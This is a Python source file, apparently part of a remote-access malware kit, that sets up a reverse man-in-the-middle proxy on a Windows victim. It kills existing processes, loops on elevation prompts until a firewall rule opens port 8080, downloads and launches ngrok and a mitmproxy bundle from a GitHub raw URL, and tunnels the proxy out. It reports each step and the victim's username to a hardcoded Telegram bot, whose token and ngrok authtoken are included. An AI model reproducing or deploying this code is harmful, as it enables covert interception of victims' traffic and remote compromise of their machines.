# -*- coding: utf-8 -*- 
from zipfile import ZipFile
import requests
import os
import sys
import getpass
from subprocess import Popen
import win32com.shell.shell as shell
import ctypes
class MITMProxy():
	def __init__(self):

		self.token = "5226296304:AAFALU7Us4WnjEx4RbJsV1U3ZyhGiKYxKFo"
		self.chat_id = "5176730926"
		self.auth = "27D5cTLjSznClCfArRRGjs2os83_6Ps5YmFqGTfUVZgvnR7e1"
		self.ngrok = "https://raw.githubusercontent.com/UQABXO/DARK-X/main/bin/ngrok-stable-windows-386.zip"
		self.mitmfproxy = "https://raw.githubusercontent.com/UQABXO/DARK-X/main/bin/mitmfproxy.zip"
		self.Main()

	def Main(self):
		os.system('taskkill /IM ngrok.exe /F')
		os.system('taskkill /IM mitmproxy.exe /F')
		self.Open_Ports()
		self.MITM_Proxy()
		self.Ngrok()
		self.SendMessage("✔️ Reverse Proxy Ready.")
	def Ngrok(self):
		if os.path.exists(os.environ['APPDATA'] + "\\ngrok.exe") == False:
			self.SendMessage("📌 Donwloading Ngrok...")
			req = requests.get(self.ngrok)
			
			filename = os.environ['APPDATA'] + "\\ngrok.zip"
			file = open(filename, "wb")
			file.write(req.content)
			file.close()
		
			with ZipFile(filename, 'r') as zip_ref:
				zip_ref.extractall(os.environ['APPDATA'])
		Popen([os.environ['APPDATA'] + "\\ngrok.exe", "authtoken", self.auth])
		Popen([os.environ['APPDATA'] + "\\ngrok.exe","tcp","8080"])
		self.SendMessage("📌 Ngrok Executed.")

	def MITM_Proxy(self):
		if os.path.exists(os.environ['APPDATA'] + "\\mitmfproxy\\mitmproxy.exe") == False:
			self.SendMessage("📌 Donwloading MITMF...")
			req = requests.get(self.mitmfproxy)
			
			filename = os.environ['APPDATA'] + "\\mitmfproxy.zip"
			file = open(filename, "wb")
			file.write(req.content)
			file.close()
			with ZipFile(filename, 'r') as zip_ref:
				zip_ref.extractall(os.environ['APPDATA'])
		shell.ShellExecuteEx(lpFile=os.environ['APPDATA'] + r"\mitmfproxy\mitmproxy.exe")
		self.SendMessage("📌 MITMProxy Executed.")

	def Open_Ports(self):
		output = os.popen('netsh advfirewall firewall show rule name="mitmproxy.exe"').read()
		if "mitmproxy" not in output:
			while True:
				try:
					shell.ShellExecuteEx(lpVerb='runas', lpFile="cmd.exe", lpParameters="/c netsh advfirewall firewall add rule name=\"mitmproxy.exe\" dir=in action=allow protocol=TCP localport=8080")
					break
				except:
					pass
	def SendMessage(self,message):
		self.Request("https://api.telegram.org/bot" + self.token + "/sendMessage?text=" + message + "\n--" + getpass.getuser() + "--&chat_id=" + self.chat_id)

	def Request(self,url):
		return requests.get(url).text.encode("utf-8")
MITMProxy()
